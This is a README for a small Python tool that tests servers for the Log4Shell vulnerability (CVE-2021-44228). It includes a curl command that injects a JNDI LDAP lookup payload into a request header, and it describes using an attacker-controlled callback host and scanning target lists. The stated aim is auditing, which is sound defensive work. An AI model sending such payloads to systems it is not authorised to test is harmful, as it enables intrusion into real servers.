---
title: "README"
tags: ""
---

# Little Log4Shellper

Simple tool I wrote on a pleasant Sunday afternoon.  

This tool leverages a log4j vulnerability, [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228). The exploit involves injecting a malicious payload into a GET request header.  

While the original intent was to quickly audit multiple servers, the --payload option could be used to extend that functionality.   

E.g.

```bash
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://1270.0.0.1/o=refence}
```
### Usage
![image.png](https://boostnote.io/api/teams/eAAUv2RbL/files/5c5d35acdd39c1cea1b4012476057b867cc7d0b6dcce35a6579b4c8805859452-image.png)

### Example

Spin up a test target

![image.png](https://boostnote.io/api/teams/eAAUv2RbL/files/44e93d53cc0f2b43551cc2df6da7615cbb0364f9007c2dfa0dc82d3ff7220687-image.png)

Spin up or use an attacker owned host.  
In this example I use a free log4shell server hosted by Huntress.
This is but one approach.

![image.png](https://boostnote.io/api/teams/eAAUv2RbL/files/09035f0d15afe2eb34a28d1aa6a3f0fb0602148b4da54eb084c8fab539d1388b-image.png)

Run logshellper.py

![image.png](https://boostnote.io/api/teams/eAAUv2RbL/files/84b326f78c4a6d0c7b88db8b9b20065e126a8864453e73de038a37902fa8843b-image.png)

Check results. If the target show up on the attacker's server, the target is exploitable.
![image.png](https://boostnote.io/api/teams/eAAUv2RbL/files/0d7cd3edc7fbf29d1e4c05c9d9e15c3b420c238890a92ef4ccb1d01c655ee0e6-image.png)


### TODO
parse .csv file (i.e. exported form censys.io) to build targets.

### Thanks
I'd like to thank the teams at Huntress.com, Lunasec.io
and everybody else who shared their research and efforts.

### References
https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java   
https://www.lunasec.io/docs/blog/log4j-zero-day/  
https://github.com/drahosj/log4shell-vulnerable-app
